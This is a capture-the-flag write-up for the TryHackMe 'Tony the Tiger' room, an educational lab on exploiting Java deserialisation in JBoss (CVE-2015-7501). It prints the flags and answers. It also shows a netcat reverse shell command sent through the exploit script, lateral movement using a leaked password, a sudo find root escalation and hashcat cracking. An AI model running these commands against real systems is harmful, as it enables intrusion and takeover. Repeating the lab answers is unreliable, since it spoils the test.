# Tony the Tiger

Learn how to use a Java Serialisation attack in this boot-to-root

# [Task 2] Support Material

Whilst this is a CTF-style room, as the approach to ultimately "rooting" the box is new to TryHackMe, I will explain it a little and leave you to experiment with. There are flags laying around that aren't focused on the CVE, so I still encourage exploring this room. Explaining the whole-theory behind it is a little out of scope for this. However, I have provided some further reading material that may help with the room - or prove interesting!


**What is "Serialisation"?**

Serialisation at an abstract is the process of converting data - specifically "Objects" in Object-Oriented Programming (OOP) languages such as Java into lower-level formatting known as "byte streams", where it can be stored for later use such as within files, databases, and/or traversed across a network. It is then later converted from this "byte stream" back into the higher-level "Object". This final conversion is known as "De-serialisation"

~~~
┌────────────┐     ┌─────────┐     ┌──────────────┐
│ Serialized │ ──► │ Network │ ──► │ Deserialized │
└────────────┘     └─────────┘     └──────────────┘
      │                                    │  
      ▼                                    ▼
┌────────────┐                     ┌──────────────┐
│   Object   │                     │    Object    │
└────────────┘                     └──────────────┘
      │                                    │  
      ▼                                    ▼
┌────────────┐                     ┌──────────────┐
│   Node1    │                     │    Node2     │
└────────────┘                     └──────────────┘
~~~


**So what is an "Object"?**

"Objects" in a programming-context can be compared to real-life examples. Simply, an "Object" is just that - a thing. "Objects" can contain various types of information such as states or features. To correlate to a real-world example...Let's take a lamp.

A lamp is a great "Object". a lamp can be on or off, the lamp can have different types of bulbs - but ultimately it is still a lamp. What type of bulb it uses and whether or not the lamp is "on" or "off" in this instance is all stored within an "Object".


**How can we exploit this process?**

A "serialisation" attack is the injection and/or modification of data throughout the "byte stream" stage. When this data is later accessed by the application, malicious code can result in serious implications...ranging from DoS, data leaking or much more nefarious attacks like being "rooted"! Can you see where this is going...?

## #2.1 - What is a great IRL example of an "Object"?

Answer: `lamp`

## #2.2 - What is the acronym of a possible type of attack resulting from a "serialisation" attack?

Answer: `DoS`

## #2.3 - What lower-level format does data within "Objects" get converted into?

Answer: `byte stream`


# [Task 3] Reconnaissance

Your first reaction to being presented with an instance should be information gathering.

## #3.1 - What service is running on port "8080"

Nmap reveals that `Apache Tomcat/Coyote JSP engine 1.1` is running on port 8080:

~~~
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss AS
~~~

## #3.2 - What is the name of the front-end application running on "8080"?

Answer: `JBOSS`

# [Task 4] Find Tony's Flag!

Tony has started a totally unbiased blog about taste-testing various cereals! He'd love for you to have a read...

## #4.1 - This flag will have the formatting of "THM{}"

There is a picture inserted in the "Frosted Flakes", one of the posts from the blog:

!["be2sOV9.jpg"](files/be2sOV9.jpg)

~~~
$ curl -s http://10.10.185.100/posts/frosted-flakes/ | grep img
  <link rel='icon' type='image/x-icon' href="https://i.imgur.com/ATbbYpN.jpg" />
<p><img src="https://i.imgur.com/be2sOV9.jpg" alt="FrostedFlakes"></p>
    <img alt="Author Avatar" src="https://i.imgur.com/ATbbYpN.jpg" />
~~~

The flag is hidden in this picture:

~~~
$ wget https://i.imgur.com/be2sOV9.jpg
$ strings be2sOV9.jpg | grep THM
}THM{Tony_Sure_Loves_Frosted_Flakes}
'THM{Tony_Sure_Loves_Frosted_Flakes}(dQ
~~~

Answer: `THM{Tony_Sure_Loves_Frosted_Flakes}`

# [Task 5] Exploit!

Download the attached resources (`48.3MB~`) to this task by pressing the "Download" icon within this task.

* FILE NAME: `jboss.zip (48.3MB~)`
* MD5 CHECKSUM: `ED2B009552080A4E0615451DB0769F8B`

The attached resources are compiled together to ensure that everyone is able to complete the exploit, these resources are not my own creations (although have been very slightly modified for compatibility) and all credit is retained to the respective authors listed within "credits.txt" as well as the end of the room.

It is your task to research the vulnerability [CVE-2015-7501](https://www.rapid7.com/db/vulnerabilities/http-jboss-cve-2015-7501) and to use it to obtain a shell to the instance using the payload & exploit provided. There may be a few ways of doing it...If you are struggling, [I have written an example of how this vulnerability is used to launch an application on Windows](https://blog.cmnatic.co.uk/posts/exploiting-a-java-de-serialisation-attack-on-windows-demo/).

There's also a couple of ways of exploiting this service - I really encourage you to investigate into them yourself!

## #5.1 - I have obtained a shell.

Open a listener:

~~~
$ rlwrap nc -nlvp 4444
~~~

And run the exploit :

~~~
unknown@kali:/data/tmp/jboss$ python exploit.py 10.10.185.100:8080 "nc -e /bin/bash 10.9.0.54 4444"
[*] Target IP: 10.10.185.100
[*] Target PORT: 8080
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Command executed successfully
~~~

We now have a reverse shell:

~~~
unknown@kali:/data/tmp$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.9.0.54] from (UNKNOWN) [10.10.185.100] 39902
SHELL=/bin/bash script -q /dev/null
cmnatic@thm-java-deserial:/$ whoami
cmnatic
cmnatic@thm-java-deserial:/$ 
~~~

# [Task 6] Find User JBoss' flag!

Knowledge of the Linux (specifically Ubuntu/Debian)'s file system structure & permissions is expected. If you are struggling, I strongly advise checking out the fantastic TryHackMe ZTHLinux Room by lollava.

## #6.1 - This flag has the formatting of "THM{}"

~~~
cmnatic@thm-java-deserial:/home$ grep -R "THM{" * 2>/dev/null
jboss/.jboss.txt:THM{50c10ad46b5793704601ecdad865eb06}
jboss/.bash_history:echo "THM{50c10ad46b5793704601ecdad865eb06}" > jboss.txt
~~~

# [Task 7] Escalation!

## #7.1 - The final flag does not have the formatting of "THM{}"

*Hint: We will, we will Rock You...*

**Normal boot-to-root expectations apply here! It is located in `/root/root.txt`. Get cracking :)**

### Lateral movement (cmnatic -> jboss)

There is an interesting note in jboss' home directory that discloses the user's password:

~~~
cmnatic@thm-java-deserial:/home/jboss$ cat note
Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.

However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: likeaboss

Kind Regards,
CMNatic
~~~

Let's connect as `jboss` with the `likeaboss` as password.

### Privile escalation (jboss -> root)

Let's check the privileges:

~~~
jboss@thm-java-deserial:~$ sudo -l
Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
~~~

We can execute find with sudo privileges without password, which allows us to get a root shell:

~~~
jboss@thm-java-deserial:~$ sudo find . -exec /bin/bash \; -quit
root@thm-java-deserial:~# cd /root
root@thm-java-deserial:/root# ls -la
total 24
drwx------  2 root root 4096 Mar  6 15:52 .
drwxr-xr-x 22 root root 4096 Mar  4 13:29 ..
-rw-------  1 root root   54 Mar  7 00:41 .bash_history
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-r--r--  1 root root   46 Mar  6 15:52 root.txt
root@thm-java-deserial:/root# cat root.txt 
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
~~~

We are provided with a base64 encoded string that gives us a hash:

~~~
root@thm-java-deserial:/root# cat root.txt | base64 -d
BC77AC072EE30E3760806864E234C7CF
~~~

This has is found [here](http://www.md5this.com/list.php?page=72394&key=1&author=ToXiC&country=Cyprus&city=Nicosia) and corresponds to the `zxcvbnm123456789` string, which gives us the flag:

We may have also cracked the hash ourselves:

~~~
$ hashcat -a 0 -m 0 BC77AC072EE30E3760806864E234C7CF /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-4800MQ CPU @ 2.70GHz, 1024/3144 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=0 -D _unroll'
* Device #1: Kernel m00000_a0-pure.c956682c.kernel not found in cache! Building may take a while...
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 4 secs

bc77ac072ee30e3760806864e234c7cf:zxcvbnm123456789
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: bc77ac072ee30e3760806864e234c7cf
Time.Started.....: Wed Jun 24 14:25:00 2020 (1 sec)
Time.Estimated...: Wed Jun 24 14:25:01 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1111.9 kH/s (0.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 231424/14344385 (1.61%)
Rejected.........: 0/231424 (0.00%)
Restore.Point....: 229376/14344385 (1.60%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 170176 -> youngc1

Started: Wed Jun 24 14:24:39 2020
Stopped: Wed Jun 24 14:25:02 2020
~~~

Flag: `THM{zxcvbnm123456789}`

# [Task 8] Final Remarks, Credits & Further Reading

**Final Remarks**

I hope this was a refreshing CTF, where classic techniques meet new content on THM - all of which are not based around Metasploit!

This type of attack can prove to be extremely dangerous - as you'd hopefully of discovered by now. It's still very real as sigh, java web applications are still used day-to-day. Because of their nature, "Serialisation" attacks all execute server-side, and as such - it results in being very hard to prevent from Firewalls / IDS' / IPS'.

For any and all feedback, questions, problems or future ideas you'd like to be covered, please get in touch in the TryHackMe Discord (following Rule #1)

So long and thanks for all the fish!

CMNatic

**Credits**

Again, to reiterate, the provided downloadable material has only slightly been adapted to ensure compatibility for all users across TryHackMe. Generating and executing the payload especially is very user-environment dependant (i.e. Java versions, of which are hard to manage on Linux, etc...)

Many thanks to byt3bl33d3r for providing a reliable Proof of Concept, and finally to all the contributors towards Frohoff's Ysoserial which facilitates the payload generation used for this CVE.


**Further Reading**

﻿If you are curious into the whole "Serialisation" and "De-Serialisation" process and how it can be exploited, I recommend the following resources:

* https://www.baeldung.com/java-serialization
* http://frohoff.github.io/appseccali-marshalling-pickles/
* https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
* https://www.darkreading.com/informationweek-home/why-the-java-deserialization-bug-is-a-big-deal/d/d-id/1323237
